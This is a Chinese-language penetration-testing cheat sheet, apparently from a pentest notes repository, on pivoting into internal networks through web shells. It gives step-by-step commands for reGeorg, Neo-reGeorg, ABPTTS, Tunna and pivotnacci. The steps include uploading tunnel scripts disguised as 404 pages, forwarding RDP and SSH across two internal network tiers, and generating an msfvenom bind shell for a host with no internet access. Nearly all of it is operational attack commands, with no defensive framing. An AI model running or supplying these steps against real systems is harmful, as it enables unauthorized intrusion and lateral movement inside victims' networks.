  #### reGeorg
	https://github.com/sensepost/reGeorg
	>python reGeorgSocksProxy.py -u http://靶机/tunnel.aspx -l 外网IP -p 10080
	打开Proxifier，更改为脚本指定的端口10080
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/332.png)

	或proxychains
	>vim /etc/proxychains.conf
	去掉dynamic_chain注释>添加socks5 127.0.0.1 10080
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/333.png)

	或MSF
	>setg proxies socks5:外网IP:10080
	>setg ReverseAllowProxy true 允许反向代理
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/334.png)
  #### Neo-reGeorg
	Step 1. 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器
	$ python3 neoreg.py generate -k password
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/335.png)

	伪装页面
	$ python3 neoreg.py generate -k <you_password> --file 404.html
	Step 2. 使用 neoreg.py 连接WEB服务器，在本地建立 socks 代理
	$ python3 neoreg.py -k password -u http://xx/tunnel.php
	$ python3 neoreg.py -k <you_password> -u <server_url> --skip
	开启代理
	$ python neoreg.py -k <you_password> -l 外网IP -p 10081 -u http://xx/neo-tunnel.aspx
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/336.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/337.png)
  #### ABPTTS端口转发
	https://github.com/nccgroup/ABPTTS
	端口转发
	>python abpttsfactory.py -o webshell 生成shell
	./webshell目录下生成的相应脚本文件传入目标中
	>python abpttsclient.py -c webshell/config.txt -u "http://目标网址/trans.aspx" -f 攻击机IP:12345/目标IP:3389
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/338.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/339.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/340.png)

	ABPTTS转发内网其他机器端口
	>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/341.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/342.png)

	要转发多个机器或多个端口
	>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389 -f 192.168.0.107:33891/10.1.1.101:80 -f 192.168.0.107:33892/10.1.1.102:22
	SSH代理一级网段
	需要一台有权限的Linux靶机
	>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.108:22
	>ssh -p 222 -qTfnN -D 0.0.0.0:1081 root@192.168.0.107
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/343.png)

	配置proxychains即可
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/344.png)

	SSH代理二级网段
	需要靶机web权限，一级内网一台web权限
	转发内网web出来传入abptts的shell
	>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:8080/10.1.1.108:80 
	>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.107/qq.aspx -f 192.168.0.107:222/10.1.1.106:22
	SSH连接192.168.0.107:222即可到达二级网络
	反弹msf
	kali生成bind型脚本
	>msfvenom -p linux/x64/shell_bind_tcp LPORT=12138 -f elf -o shell
	在二级不出网linux上执行
	将他的12138端口通过abptts转出
	>python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:13128/10.1.1.101:12138
	Msf本地监听13128即可
  #### Tunna转发
	>python proxy.py -u http://192.168.0.98/tunnel.aspx -l 12138 -r 3389 –v
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/345.png)

  #### pivotnacci
	>pip3 install pivotnacci
	>pivotnacci  https://domain.com/agent.php --password "s3cr3t"
	>pivotnacci  https://domain.com/agent.php --polling-interval 2000